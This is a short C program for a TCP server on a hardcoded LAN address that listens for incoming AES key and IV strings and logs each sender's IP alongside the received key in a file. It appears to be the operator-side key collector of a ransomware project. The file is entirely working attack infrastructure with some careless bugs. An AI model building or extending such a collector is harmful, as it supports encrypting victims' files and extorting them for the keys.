#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <dirent.h>

#define SIZE 1024

#define OPENSSL_KEY_SIZE ((256/8) * 2 + 1)
#define OPENSSL_IV_SIZE ((128/8) * 2 + 1)

void usage(void){
    printf("Options :\n\n");
    printf("    -h          Display the help of the software.\n");
    printf("    -l          Start the listening on network to reciev\n");
    printf("                the key and iv potentialy sent.\n\n");

    printf("exemples of listening :\n\n");
    printf("    -l\n\n");
}

int get_msg(int sockid, struct sockaddr_in client_addr, int client_socket){
    int len = sizeof(client_addr);
    char *buffer[SIZE];

    client_socket = accept(sockid, (struct sockaddr *)&client_addr, &len);

    if(client_socket < 0){
        printf("Error during accept !\n");
        return 0;
    }

    printf("Request accepted from %s:%d\n", inet_ntoa(client_addr.sin_addr), client_addr.sin_port);

    recv(client_socket, (char *)buffer, SIZE, MSG_WAITALL);
    printf("Got msg from %s:%d\n", inet_ntoa(client_addr.sin_addr), client_addr.sin_port);

    //write client address in a file (upgrade to stock severals clients)
    FILE *file;
    file = fopen("clients.txt", "w");
    
    char line[SIZE];
    snprintf(line, sizeof(line), "%s | %s", inet_ntoa(client_addr.sin_addr), buffer);
    fputs(line, file);

    fclose(file);
}

int main(int argc, char *argv[]){

    //start server
    int server_port = 8888;
	char *server_ip = "192.168.1.5";

	int sockid = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in server_addr, client_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(server_port);
	server_addr.sin_addr.s_addr = inet_addr(server_ip);

	int bind_result = bind(sockid, (const struct sockaddr *) &server_addr, sizeof(server_addr));
    
    int n, client_socket;
    
    if(bind_result < 0){
        printf("Error during binding\n");
    }
    else{    
        //possible actions
        if(argc > 1){
            if(strcmp(argv[1], "-l") == 0){
                printf("Server starting on %s:%d\n", server_ip, server_port);
                n = listen(sockid, 1);

                if(n < 0){
                    printf("Error during listening !\n");
                    return 0;
                }
                
                printf("Server listening ...\n");
                n = get_msg(sockid, client_addr, client_socket);
            }
            else if(strcmp(argv[1], "-h") == 0){
                usage();
            }
            else{
                printf("wrong argument gived !\n");
            }
        }
        else{
            printf("non argument gived !\n");
        }
    }

    close(sockid);
}